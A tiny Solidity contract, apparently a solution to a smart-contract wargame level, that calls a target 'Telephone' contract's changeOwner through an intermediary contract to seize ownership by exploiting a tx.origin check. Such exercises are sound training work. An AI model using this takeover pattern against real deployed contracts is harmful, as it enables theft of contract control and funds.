// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

import './Telephone.sol';

contract TelephoneHack {

  function hack(Telephone targetAddress) public {
    targetAddress.changeOwner(msg.sender);
  }
}